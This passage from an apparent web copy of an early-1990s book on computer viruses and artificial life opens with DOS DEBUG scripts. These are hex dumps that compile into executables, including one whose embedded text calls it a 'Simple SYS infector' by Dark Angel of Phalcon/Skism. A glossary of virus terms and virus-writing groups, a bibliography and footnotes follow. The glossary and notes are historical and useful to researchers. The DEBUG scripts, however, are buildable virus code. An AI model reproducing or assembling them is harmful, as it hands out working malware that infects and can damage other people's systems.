e 360 2E 53 4C 58 00 18 40 00 00 00 00 00 00 00 00 00
e 370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 3A0 00 00
rcx
2A2
w
q
</pre>
<!--p.256-->
<h3><a name="pm8"></a>SYS Inf</h3>
<pre class="source">
n sysvir.sys
e 100 FF FF FF FF 00 80 4F 00 60 00 53 59 53 20 49 4E
e 110 46 24 00 53 69 6D 70 6C 65 20 53 59 53 20 69 6E
e 120 66 65 63 74 6F 72 0D 0A 57 72 69 74 74 65 6E 20
e 130 62 79 20 44 61 72 6B 20 41 6E 67 65 6C 20 6F 66
e 140 20 50 68 61 6C 63 6F 6E 2F 53 6B 69 73 6D 00 56
e 150 E8 00 00 5E 2E 89 9C B0 01 2E 8C 84 B2 01 5E CB
e 160 1E 06 0E 1F E8 00 00 5D 2E C4 9E 9C 01 26 C7 47
e 170 03 03 81 26 80 7F 02 00 75 46 26 8C 4F 10 8D 76
e 180 99 26 89 77 0E 26 FE 4F 03 B8 0F 0B CD 21 81 F9
e 190 0F 0B 74 2C 26 81 47 0E 2A 02 26 C7 47 03 00 01
e 1A0 33 C0 8E D8 C4 1E 84 00 2E 89 5E 65 90 2E 8C 46
e 1B0 67 90 8D 76 5C 90 FA 89 36 84 00 8C 0E 86 00 FB
e 1C0 07 1F CB 3D 0F 0B 75 02 91 CF 9C 9A 00 00 00 00
e 1D0 9C 55 50 8B EC 8B 46 04 89 46 0A 58 5D 9D 80 FC
e 1E0 11 74 05 80 FC 12 75 E1 3C FF 74 DD 55 E8 00 00
e 1F0 5D 81 ED F0 00 50 53 51 52 1E 06 56 57 B4 2F CD
e 200 21 06 1F 80 3F FF 75 03 83 C3 07 8B 4F 1D 2E 89
e 210 8E 16 02 0E 07 FC 8D BE 09 02 8D 77 01 81 3C 43
e 220 4F 74 49 B9 08 00 80 3C 20 74 03 A4 E2 F8 B0 2E
e 230 AA B8 53 59 8D 77 09 39 04 75 31 38 44 02 75 2C
e 240 AB AA B0 00 AA 1E 07 0E 1F 87 FB E8 AB 00 72 1C
e 250 B4 3F B9 02 00 8D 96 07 02 CD 21 B4 3E CD 21 2E
e 260 FF 86 07 02 74 10 26 81 6D 1D 03 02 5F 5E 07 1F
e 270 5A 59 5B 58 5D CF 1E 07 8D B6 00 00 8D BE 18 02
e 280 B9 12 00 F3 A4 2E 8B 8E 16 02 83 C1 4F 89 8E 1E
e 290 02 83 C1 11 2E 89 8E 20 02 B8 00 43 8D 96 09 02
e 2A0 CD 21 51 52 B8 01 43 33 C9 8D 96 09 02 CD 21 E8
e 2B0 45 00 B8 00 57 CD 21 51 52 B4 40 B9 02 00 8D 96
e 2C0 16 02 CD 21 B8 02 42 33 C9 99 CD 21 B4 40 B9 12
e 2D0 00 8D 96 18 02 CD 21 B4 40 B9 F1 01 8D 96 12 00
e 2E0 CD 21 B8 01 57 5A 59 CD 21 B4 3E CD 21 B8 01 43
e 2F0 59 5A CD 21 E9 75 FF B0 02 B4 3D 8D 96 09 02 CD
e 300 21 93 C3
rcx
203
w
q
</pre>
<!--p.257-->
<p><strong>Dictionary of Computer Virus, Artificial Life, Synthetic Psychology, and Related Terms</strong></p>
<dl>
	<dt>AI</dt><dd>Acronym for Artificial Intelligence</dd>
	<dt>ASM</dt><dd>Assembler Language</dd>
	<dt>Activation Period</dt><dd>The time frame beginning with the initial infection to the time it is set to DETONATE.</dd>
	<dt>A-Life</dt><dd>Short for Artificial Life</dd>
	<dt>ANARKICK SYSTEMS</dt><dd>A virus writing/hacking organization led by Lucifer Messiah in Toronto, Canada, and Volatile Ram in Malmo, Sweden. This group also has chapters in Australia/New Zealand, and Germany, although they are mainly involved in hacking, and not viruses. Certain text files released in the virus community by Data Disruptor (of RABID fame) suggest some intermingling between the two groups. ANARKICK SYSTEMS has just recently started putting the group name into the viruses and utilities they write. Lucifer Messiah may be reached via the Internet at <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5f332a3c36393a2d1f2f3c2c3c3e29713c3032">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></dd>
	<dt>Anti-Hack Routines</dt><dd>Very advanced code included in viruses or other forms of computer programming, intended to make the program difficult or impossible to debug, or to derive source code from. Examples of this sort of programming can be found elsewhere in this book.</dd>
	<dt>Appending Virus</dt><dd>A virus which appends its code at the end of the executable file, and modifies the first few bytes (if a .COM file), or the header (if an .EXE file), so that it gains control first, before executing the host.</dd>
	<dt>Artificial Intelligence</dt><dd>A branch of science studying the possibility of creating intelligence on the computer.</dd>
<!--p.258-->
	<dt>Artificial Life</dt><dd>A branch of science studying the possibility of creating life, or studying life on the computer or other non-biological matter. Computer viruses are a form of Artificial Life.</dd>
	<dt>Assembly Language</dt><dd>Also known as ASM, Assembly Language is the programming language of choice for virus authors. ASM opcodes translate directly into the binary information read and understood by the PC. This produces more compact and very powerful code.</dd>
	<dt>Automaton</dt><dd>See Vehicle.</dd>
	<dt>Boot Sector Virus</dt><dd>A virus which places itself in the boot sector so that it is executed when booting up the computer. This may be overwriting, although most examples of this form move the boot sector to a separate area of the disk to be executed after the virus code is run.</dd>
	<dt>Bug</dt><dd>An error in an application's code. Bugs are often mistaken for viruses due to the unusual results seen when running a buggy program.</dd>
	<dt>CA</dt><dd>Cellular Automaton</dd>
	<dt>Cellular Automaton</dt><dd>A finite state machine consisting of a matrix of cells. The state of each cell depends upon its current state and the state of the cells surrounding it.</dd>
	<dt>Combination Virus</dt><dd>A virus which can infect more than one type of file.</dd>
	<dt>Companion Virus</dt><dd>A virus which infects .EXE files by making a copy of itself in .COM format, and sharing the same name as the .EXE file being infected. By doing this, the .COM file will be run first. The virus will then execute the .EXE host file.</dd>
	<dt>Construction Utility</dt><dd>A program designed to mass produce computer viruses using only limited input from the user.</dd>
<!--p.259-->
	<dt>Central Processing Unit</dt><dd>The "brain" of the computer. The part of the computer that executes code.</dd>
	<dt>CPU</dt><dd>Central Processing Unit.</dd>
	<dt>Dark Avenger</dt><dd>The working name of an extremely prolific virus writer from Bulgaria. He is responsible for most of the viruses bearing this name, and the MuTating Engine. He is the founder of CrazySoft, a virus writing organization in Bulgaria. Dark Avenger may be reached via Internet EMAIL at <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f4909582b4849787979582da979b99">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></dd>
	<dt>Debug</dt><dd>To read through source code looking for bugs.</dd>
	<dt>DEBUG</dt><dd>The name of the debugger program that is included with MSDOS and PCDOS.</dd>
	<dt>DEBUG Script</dt><dd>A text file containing the hex dump of a binary file with certain DEBUG commands. DEBUG Scripts can compile the executable file by typing:
		<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">DEBUG <span style="color: #33cc33;">&lt;</span>FILENAME.EXT</div>
		on the DOS command line. DEBUG scripts are written for PCDOS and MSDOS only. DRDOS uses a debugger called SID instead. Scripts in this book will need to be altered to work with DRDOS' S.I.D. debugging program.</dd>
	<dt>Debugger</dt><dd>A program designed to execute another program line-by-line. Used by hackers and programmers for a variety of needs.</dd>
	<dt>Demoralized Youth</dt><dd>A virus writing organization based in Sweden, Norway, and other parts of Scandinavia.</dd>
	<dt>Detonation</dt><dd>The stage of a computer virus' life, when, in reaction to certain stimuli, will cause some action to happen. This is often a damaging routine, but may be something as simple as text being printed onto the screen. Not all computer viruses have a detonation stage.</dd>
<!--p.260-->
	<dt>Directory Infector</dt><dd>At present, a very rare form of computer virus that infects the directory structure and FAT files, and not the actual EXE or COM files. at present, there are only two strains of this virus type.</dd>
	<dt>Dissassembler</dt><dd>A program designed to develop accurate, often commented, source code from a compiled program. See: Reverse Engineering</dd>
	<dt>Dry Life</dt><dd>Artificial life implementation via non-living matter.</dd>
	<dt>Emergent Behavior</dt><dd>Global behavior spontaneously produced via local rules. This behavior is not explicitly coded.</dd>
	<dt>Encryption</dt><dd>Text or code which is somehow altered to make it unintelligible until processed by a decryption routine. Compression is a form of encryption.</dd>
	<dt>Entropy</dt><dd>A measure of chaos.</dd>
	<dt>FAT</dt><dd>The File Allocation Table. This is the area on the disk that keeps track of file location on the disk, and allocates space to new files. This is often the target during the detonation period of malicious viruses.</dd>
	<dt>Finite State Machine</dt><dd>A system with only a certain number of possible states. Each state is determined by the current state and by any information recieved while in the present state.</dd>
	<dt>Footprint</dt><dd>A piece of code associated solely with a particular virus or virus group. See: Scanner.</dd>
	<dt>Genetic Algorithm</dt><dd>A form of computer programming often used in Artificial Life studies, which imitates genetic mutation and laws of evolution.</dd>
<!--p.261-->
	<dt>Hack Job</dt><dd>A virus derived from someone else's code. Often only text and small routines are altered. This is often done by less-proficient virus writers in an attempt to get named in Patricia Hoffman's VSUM [See: NuKe], or occasionally by virus writers who actually are knowledgeable enough to write their own viruses, but wish to extend the life of a particular strain of virus.</dd>
	<dt>Hacker</dt><dd>One who uses his/her computer or other electronic devices to get a particular service for free, or to get information illegally. This term is erroneously attached to virus writers. Only a few virus authors are involved in hacking.</dd>
	<dt>Heuristic Scanning</dt><dd>A method of scanning viruses, by searching for key virus traits, such as a modifiable entry-point, or code to search out .COM and .EXE files. Heuristic Scanning is the most accurate, and most difficult method to outsmart.</dd>
	<dt>Hex Dump</dt><dd>All the bytes in a file listed in such a way that their hexadecimal equivalents are displayed. Eg: A two byte program only containing the <strong>INT 20h</strong> assembly command would be displayed as: <strong>CD 20</strong>. DEBUG scripts are Hex Dumps with commands for DOS' DEBUG program.</dd>
	<dt>Host</dt><dd>The program containing a virus.</dd>
	<dt>Infect</dt><dd>The primary action of a computer virus which sets it aside from other forms of computer programming. This is the ability to search out a victim, then copy itself onto that victim in such a way that it will be run when the user tries to run that program.</dd>
	<dt>Infection</dt><dd>The presence of one or more computer viruses on your computer.</dd>
	<dt>Mutation</dt><dd>Alteration of the genetic makeup of an organism.</dd>
<!--p.262-->
	<dt>Mutating Engine</dt><dd>A routine added to virus code which causes the encryption engine to change for each infection. This technique was realized and mastered by Dark Avenger.</dd>
	<dt>MuTating Engine</dt><dd>The mutating engine created by Dark Avenger. This engine was released to into the computer underground in the form of an .OBJ file easily linked to and used by other viruses.</dd>
	<dt>NuKe</dt><dd>A defunct virus hacking group from Montreal, Canada. This group was forced into collapse from the virus writing community because all their viruses were simply renamed versions of already existing viruses. NuKe's Rock Steady often wrote messages announcing his "new" viruses in public BBS forums under false names such as Stevens Wallace, although he was never taken as seriously as he had hoped. A few of NuKe's better members still survive and operate in the underground. Nuke can be reached via Internet EMAIL at <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="82ece3f6e3f1c2f2e1f1e1e3f4ace1edef">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></dd>
	<dt>Overwriting Virus</dt><dd>A generally rare and outdated form of computer virus which completely overwrites its victims, making them easily detectable.</dd>
	<dt>Parasitic Infector</dt><dd>A very common form of computer virus. It does not overwrite any part of the host, except parts of code which it restores before handing control over to it.</dd>
	<dt>Partition Table</dt><dd>A list of various parameters contained in the first sector of the hard drive. The parameters are used to tell DOS how the disk is set up, and where to boot from.</dd>
	<dt>Patch</dt><dd>Programs created to modify the code of existing files. Programmers often release patches to fix bugs in previous versions of their software.</dd>
<!--p.263-->
	<dt>Phalcon/SKISM</dt><dd>One of the more interesting virus writing organizations based in the United States. P/S wrote the MPC and G² virus-making kits, as well as several highly advanced computer viruses. Dark Lord, one of the group's head programmers, invented, and made the first protocol .SYS infector. SKISM is an acronym for Smart Kids Into Sick Methods. For information via the internet, send EMAIL to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ef9c86828081af9c84869c82c18380888681c19e8cc18c8e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></dd>
	<dt>Polymorphic</dt><dd>Able to change indefinitely. Computer viruses which can rewrite their encryption routines variably are considered polymorphic.</dd>
	<dt>RABID</dt><dd>A defunct virus writing organization from Toronto, Canada (not Bulgaria, as was once maintained). Its only remaining member, Data Disruptor, joined several other groups, and has since joined forces with YAM, changing the name to RABID/YAM. RABID is an acronym for Rebellion Against Big Irreversible Dinks. Data Disruptor can be reached via Internet EMAIL at <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="781c110b0a0d080c170a38081b0b1b190e561b1715">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> See: YAM</dd>
	<dt>Replication</dt><dd>The main task of a computer virus. This is the process in which the virus isolates itself from the host and attaches a copy of itself to another host. Processes for doing this vary greatly.</dd>
	<dt>Reverse Engineering</dt><dd>The act of using a debugger or dissassembler to derive working source code for files. This technique is used by hackers for finding "trade secrets".</dd>
	<dt>Safe Hex</dt><dd>A euphemism for safe (virus free) computing. Taken from the term "safe sex".</dd>
	<dt>Scan Code</dt><dd>See: Footprint</dd>
	<dt>Scan String</dt><dd>See: Footprint</dd>
	<dt>Spawning Virus</dt><dd>See: Companion Virus</dd>
<!--p.264-->
	<dt>System Infector</dt><dd>A newer form of virus which infects .SYS files. This idea was brought to life by Dark Angel of Phalcon/SKISM. An example of this virus type can be found elsewhere in this book.</dd>
	<dt>Techno-peasant</dt><dd>One who is ignorant towards technology especially as pertaining to computer technology.</dd>
	<dt>Trojan Horse</dt><dd>Not a virus, nor is it related at all to viruses. Trojans are seemingly useful programs with hidden malicious code included. They do not reproduce, or do many of the other functions required of viruses. This book only lightly touches on this subject.</dd>
	<dt>Vehicle</dt><dd>A machine housing certain sensory, and thought-processing equipment, used in the study of Synthetic Psychology. "vehicle" and "automaton" are synonymous.</dd>
	<dt>Victim</dt><dd>See: Host</dd>
	<dt>VIPER</dt><dd>A small, possibly defunct virus writing group. VIPER is an acronym for Virally Inclined Programming Experts Ring.</dd>
	<dt>Virus Scanner</dt><dd>Any product that looks for viruses in memory or in files according to a list of viral "footprints" or "scan codes". Because this technology is easily fooled, its efficacy is debatable. It is considered by many to be useless if used as the main scanning technique.</dd>
	<dt>VSUM</dt><dd>An extensive virus database written and maintained by Patti Hoffman. This product is meant to inform the public with in depth information as new viruses are released. This product has also become somewhat of a trophy, or "status quo" for virus writers. Success is judged by number of entries per writer, and the comments entered about each virus.</dd>
	<dt>Wet Life</dt><dd>Biological life, so called because of its high water content.</dd>
<!--p.265-->
	<dt>YAM</dt><dd>A Toronto, Canada based virus writing organization. This group is no longer active. YAM is an acronym for Youngsters Against McAfee.</dd>
</dl>
<!--p.266-->
<h2><a name="pn"></a>Bibliography</h2>
<ul>
	<li>40 Hex; Hellraiser; Phalcon/SKISM</li>
	<li>ALife Digest; Artificial Life Research Group UCLA</li>
	<li>Artificial Life; Langton, Christopher; Addison Wesley, 1989 (0-201-09356-1)</li>
	<li>Artificial Life; Levy, Steven; Pantheon, 1992 (0-679-40774-X)</li>
	<li>Artificial Life II; Langton, Christopher, et al, Addison Wesley, 1992 (0-201-52571-2)</li>
	<li>Artificial Life Video Proceedings; Langton, Christopher; Addison Wesley, 1992 (0-201-55492-5)</li>
	<li>Artificial Life Playhouse; Prata, Stephen; The Waite Group, 1993 (1-878739-32-8)</li>
	<li><a href="/lib/apd01.html">Computers Under Attack</a>; Denning, Peter; Addison Wesley, 1990 (0-201-53067-8)</li>
	<li>Computer Viruses and Data Protection; Burger, Ralph; Abacus, 1991 (1-55755-123-5)</li>
	<li>Computer Viruses, Worms, Data Diddlers, Killer Programs, And Other Threats To Your System: What They Are, How They Work, And How To Defend Your PC, Mac, Or Mainframe; McAfee, John &amp; Haynes, Colin; St. Martin, 1989 (0-312-02889-X)</li>
	<li>Crypt Newsletter; Kouch, Urnst; Crypt Info Systems</li>
	<li>IEEE Software</li>
	<li>Info Journal; Rock Steady; NUKE</li>
	<li>Language Awareness; Eschholz, et al; St. Martin's Press, 1990</li>
	<li>Lying: Moral Choice in Public and Private Life; Bok, Sissella; Vintage, 1978</li>
	<li>Social Research; Babbie Earl;</li>
	<li>Metamagical Themas; Hofstadter, Douglas R.; New Sciences, 1985</li>
<!--p.267-->
	<li>Omni</li>
	<li>Webster's Dictionary, Random House, Random House, 1992</li>
	<li>Take Word For Windows To The Edge; Gallo, Guy; Ziff Davis, 1993 (1-56276-079-3)</li>
	<li>The Secret Life of a Satanist; Barton, Blanche; Feral House (0-922915-03-2)</li>
	<li>Vehicles; Braitenberg, Valentino; MIT, 1984 (0-262-02208-7)</li>
<!--p.268-->
</ul>
<h2><a name="po"></a>Further Reading</h2>
<ul>
	<li>Artificial Life Explorer's Kit</li>
	<li>Creating Artificial Life Edward Rietman Windcrest, 1993</li>
	<li>DOS Undocumented Schulman, Etc. Addison Wesley, 1990</li>
	<li>Great Mambo Chicken &amp; the Ed Regis Addison Wesley, 1990</li>
	<li>TransHuman Condition</li>
	<li>The Devil's Avenger Wolfe</li>
	<li>The Temporary Autonomous Hakim Bey Autonomedia, 1991</li>
	<li>Zone</li>
	<li>The Tommorrow Makers Grant Fjermedal Macmillan, 1986</li>
</ul>
<!--p.269-->
<hr />
<p><a name="f1" href="#b1">1</a> Vesselin Bontchev's virus collection contains 7210 viruses at the time of this writing.</p>
<p><a name="f2" href="#b2">2</a> Burger, R., Computer Viruses and Data Protection, pp. 9, Abacus, 1991</p>
<p><a name="f3" href="#b3">3</a> McAfee, J. and Haynes, C., <em>Computer Viruses, Worms, Data Diddlers, Killer Programs, and Other Threats to Your System</em>, pp. 1, St. Martin's Press, 1989</p>
<p><a name="f4" href="#b4">4</a> <strong>NOTE:</strong> There are a few very rare instances where a .BAT file may act like a virus, but require external .EXE and .COM files to carry out the reproduction. Chances are you will never run into one of these "viruses". They are far too easy to notice, and even easier to get rid of (by deleting all files that have been overwritten by .BAT type files)</p>
<p><a name="f5" href="#b5">5</a> This term stems from the fact that the virus can infect MULTIple executable file types, and the PARTITion table. Although not a true word, it is used for virus classification.</p>
<p><a name="f6" href="#b6">6</a> Burger, R., <em>Computer Viruses and Data Protection</em>, pp. 10, Abacus, 1991</p>
<p><a name="f7" href="#b7">7</a> David Gerrold, <em>When H.A.R.L.I.E. Was One</em>, Bantam Books, 1972</p>
<p><a name="f8" href="#b8">8</a> Sissela Bok, <em>Lying: Moral Choice in Public and Private Life</em>, pp 19, Vintage books, 1978</p>
<p><a name="f9" href="#b9">9</a> See, for example, Earle Babbie, <em>The Practice of Social Research</em>, pp 7, 8, Wadsworth Publishing Company, Belmont California, 1989</p>
<p><a name="f10" href="#b10">10</a> Fred Grist, <em>The Computer Paper</em>, Metro Toronto edition, Canada Computer Paper, Inc, May 1992</p>
<p><a name="f11" href="#b11">11</a> Joshua Quttner, <em>Software Hard Sell</em>, New York Newsday, pp 68, April 5, 1992</p>
<p><a name="f12" href="#b12">12</a> Ibid.</p>
<p><a name="f13" href="#b13">13</a> Ibid.</p>
<p><a name="f14" href="#b14">14</a> <em>Random House Websters</em>, College Edition, 1992</p>
<p><a name="f15" href="#b15">15</a> Note that "the computer virus industry" is a generic term which includes the anti-virus and virus enthusiasts alike.</p>
<p><a name="f16" href="#b16">16</a> Ibid</p>
<p><a name="f17" href="#b17">17</a> The identities of the participants and bulletin boards involved in this message thread have been omitted to protect those who may be adversely affected.</p>
<p><a name="f18" href="#b18">18</a> Tech note: Incidentally, the CMOS contains only ported memory, and is therefore not addressable. As well, ports can only be read from/written to one byte at a time. The CMOS simply does not provide an environment useful for a TSR virus.</p>
<p><a name="f19" href="#b19">19</a> This <strong>Proto-T</strong> virus was created with the NuKE Virus Creation Laboratory, then partly rewritten to avoid detection as a <strong>VCL</strong> varient.</p>
<p><a name="f20" href="#b20">20</a> Urnst Kouch, <em>Crypt Newsletter #10</em></p>
<p><a name="f21" href="#b21">21</a> Anonymous, in private interview with the author.</p>
<p><a name="f22" href="#b22">22</a> See, for example, Douglas R. Hofstadter, <em>Metamagical Themas: Questing for the Essence of Mind and Pattern</em>, pp 91, Bantam Books, 1986</p>
<p><a name="f23" href="#b23">23</a> <em>The Computer Paper</em>, Feb 1993</p>
<p><a name="f24" href="#b24">24</a> <em>PC World</em>, March 1993</p>
<p><a name="f25" href="#b25">25</a> <em>I.T. Magazine</em>, March 1993</p>
<p><a name="f26" href="#b26">26</a> <em>The Computer Paper</em>, Feb 1993</p>
<p><a name="f27" href="#b27">27</a> Joshua Quittner, <em>Software Hard Sell</em>, New York Newsday, pp 68, April 5, 1992</p>
<p><a name="f28" href="#b28">28</a> William S. McKiernan, <em>Dark Avenger Mutating Engine No Threat to Protected PC's</em>, Press released from McAfee and Associates on June 1, 1992</p>
<p><a name="f29" href="#b29">29</a> John McAfee, Colin Haynes, <em>Computer Viruses, Worms, Data Diddlers, Killer Programs, and Other Threats to Your System</em>, St, Martin's Press, New York, 1989</p>
<p><a name="f30" href="#b30">30</a> Quoted in Joshua Quittner, <em>Software Hard Sell</em>, New York Newsday, pp 68, April 5, 1992</p>
<p><a name="f31" href="#b31">31</a> Sissela Bok, <em>Lying: Moral Choice in Public and Private Life</em>, pp 23, Vintage Books, 1978</p>
<p><a name="f32" href="#b32">32</a> Data Disruptor, private interview, July 26, 1992</p>
<p><a name="f33" href="#b33">33</a> This is interesting, because late 1992, NuKE InfoJournal published the source code to a virus assuming the SBC moniker. This virus was actually not the SBC, but an early version of the Onario 3. The virus was larger in size than the SBC, and much of the code had been altered. As well, the source code contained many obnormalities, such as unused macros, unused variables, a larger stack, etc. It would appear more that the virus was an altered dissassembly of the KS_Test virus.</p>
<p><a name="f34" href="#b34">34</a> John McAfee and Colin Haynes, <em>Computer Viruses, Worms, Data Diddlers, Killer Programs, and Other Threats to Your System</em>, pp 102, St. Martin's Press, 1989</p>
<p><a name="f35" href="#b35">35</a> Ibid, pp 196</p>
<p><a name="f36" href="#b36">36</a> Most reports say that the virus actually reformats the drives it is attacking. In reality, the disks are simply overwritten starting at sector 0 and counting upwards. The source code for <strong>Michelangelo</strong> appears in Chapter Six for those who are interested in how this is accomplished.</p>
<p><a name="f37" href="#b37">37</a> American Megatrends Incorporated, USA</p>
<p><a name="f38" href="#b38">38</a> The Master Boot Record (MBR) is often erroneously referred to as the Partition Table. The Partition Table is a table of hard-drive parameters located towards the end of the MBR. The table is at offset 1BEh of the MBR.</p>
<p><a name="f39" href="#b39">39</a> ViruSCAN,... McAfee and Associates</p>
<p><a name="f40" href="#b40">40</a> Flu-Shot,... Ross Greenberg</p>
<p><a name="f41" href="#b41">41</a> Thunderbyte,....</p>
<p><a name="f42" href="#b42">42</a> F-Prot, Fridrick Skulason</p>
<p><a name="f43" href="#b43">43</a> Text in the virus dropper reads: "Kill-TB was created with the mega-buggy IVP version 1.73, and crashes after the second or third infection. It is only released to show off my newest trick to programmers on [a local BBS] ... I got the idea from the Thunderbyte documentation! They virtually tell you how to [disable] their system!!"</p>
<p><a name="f44" href="#b44">44</a> PKLite, Phil Katz...</p>
<p><a name="f45" href="#b45">45</a> The entire sector is incorrectly called the Partition Table by some. The Partition Table only consists of 64 bytes starting at offset 1BEh (the 446th byte) of the sector.</p>
<p><a name="f46" href="#b46">46</a> Mary Shelley, <em>Frankenstein</em>, 1818</p>
<p><a name="f47" href="#b47">47</a> The creature was called "Golem", which means "fetus" or "unformed mass". The legendary Golem was a robot-like servant, made (usually) of clay. Because they were able only to follow instructions litterally, the servants often created chaos.</p>
<p><a name="f48" href="#b48">48</a> Genesis 2:7 and 2:19, <em>King James Bible</em></p>
<p><a name="f49" href="#b49">49</a> Steven Levy, <em>Artificial Life</em>, pp 19, Pantheon, 1992</p>
<p><a name="f50" href="#b50">50</a> Blanche Barton, <em>The Secret Life of a Satanist: The Authorized Biography of Anton Lavey</em>, pp 193, Feral House, Los Angeles, 19??</p>
<p><a name="f51" href="#b51">51</a> Steven Levy, <em>Artificial Life</em>, pp 17, Pantheon, 1992</p>
<p><a name="f52" href="#b52">52</a> Ibid, pp 29</p>
<p><a name="f53" href="#b53">53</a> Peter Langton, <em>Artificial Life ][, Video Proceedings</em>, Addison Wesley, 1992</p>
<p><a name="f54" href="#b54">54</a> Gail Dutton, <em>IEEE Software</em>, vol 9 #1, pp 88, Jan 1992</p>
<p><a name="f55" href="#b55">55</a> Susan Scheck, <em>Is it Live or is it memory?</em>, Technology Review v94, pp 13, April 1991</p>
<p><a name="f56" href="#b56">56</a> Christopher Langton, <em>Artificial Life ][</em>, pp 86, Addison-Wesley, 1991</p>
<p><a name="f57" href="#b57">57</a> Christopher Langton, <em>Artificial Life ][</em>, pp 86, Addison-Wesley, 1991</p>
<p><a name="f58" href="#b58">58</a> David Gerrold, <em>When H.A.R.L.I.E. Was One</em>, Bantam Books 1972</p>
<p><a name="f59" href="#b59">59</a> Ibid, 1988</p>
<p><a name="f60" href="#b60">60</a> Ibid, 1972</p>
<p><a name="f61" href="#b61">61</a> Charles E. Taylor, <em>Artificial Life ][</em>, pp 27 Addison-Wesley, 1991</p>
<p><a name="f62" href="#b62">62</a> J.D. Farmer and A.A. Belin, <em>Artificial Life: The Coming Evolution</em>, Cambridge University Press, 1990</p>
<p><a name="f63" href="#b63">63</a> <em>Random House Webster's Disctionary</em>, College Edition, Reference Software International,1992</p>
<p><a name="f64" href="#b64">64</a> Christopher Langton, <em>Omni</em>, v 14(1), pp 130, October, 1991</p>
<p><a name="f65" href="#b65">65</a> Eugene H. Spafford, <em>Artificial Life ][</em>, pp 744, Addison-Wesley, 1991</p>
<p><a name="f66" href="#b66">66</a> Valentino Braitenberg, <em>VEHICLES: Experiments in Synthetic Psychology</em>, MIT Press, 1984</p>
<p><a name="f67" href="#b67">67</a> These instincts are guided by various sensors and wirings, which are experimentally added and subtracted.</p>
<p><a name="f68" href="#b68">68</a> Websters Dictionary, College Edition., Random House, 1992</p>
<p><a name="f69" href="#b69">69</a> Ibid</p>
<p><a name="f70" href="#b70">70</a> Ibid</p>
<p><a name="f71" href="#b71">71</a> Steven Levy, <em>Artificial Life</em>, pp 145, Pantheon Books, 1992</p>
<p><a name="f72" href="#b72">72</a> Eugene H. Spafford, <em>Artificial Life II</em>, pp 744, Addison Wesley, 1992</p>
<p><a name="f73" href="#b73">73</a> Viroid: similar to a virus, but consisting of only a short strand of DNA</p>
<p><a name="f74" href="#b74">74</a> The DTA is a table of information where various information about a file is held. One such peice of information is the file name.</p>
<p><a name="f75" href="#b75">75</a> Some source codes are compiled as ORG 0 instead of ORG 0100h. When the code is executed, it is loaded at offset 0100h, regardless. The ORG 0 is used only to make certain math functions easier to write.</p>
<p><a name="f76" href="#b76">76</a> Ralph Burger, <em>Computer Viruses and Data Protection</em>, pp 319, Abacus, 1991</p>
<p><a name="f77" href="#b77">77</a> Word Basic (c)..... Microsoft</p>
<p><a name="f78" href="#b78">78</a> SALT (c) Telix.....</p>
[<a style="" href="/lib/?lang=EN&amp;index=VX#vkj00">Back to index</a>] [<a href="/lib/vkj00.html#disqus_thread">Comments</a>]<br />    <div id="disqus_thread"></div>
    <script type="text/rocketscript">
